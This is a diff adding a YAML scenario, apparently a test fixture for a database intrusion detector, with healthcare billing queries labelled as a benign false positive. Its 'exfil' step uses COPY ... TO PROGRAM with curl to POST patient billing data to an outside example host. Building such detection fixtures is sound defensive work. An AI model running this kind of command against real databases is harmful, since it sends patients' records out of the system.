@@ -1,0 +1,33 @@
+scenario_id: gen_healthcare_54_sql_injection_ben_1538b
+family_id: gen_healthcare_54_sql_injection_fam_1538
+domain: healthcare
+time_of_day: '15:10'
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT invoice_id, payment_status FROM billing WHERE patient_id = 61054
+  - step_id: exfil
+    sql: COPY (SELECT invoice_id, payment_status FROM billing WHERE department_id
+      = '3') TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 203.0.113.227
+      port: 8080
+matched_pair_id: gen_healthcare_54_sql_injection_pair_1538
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
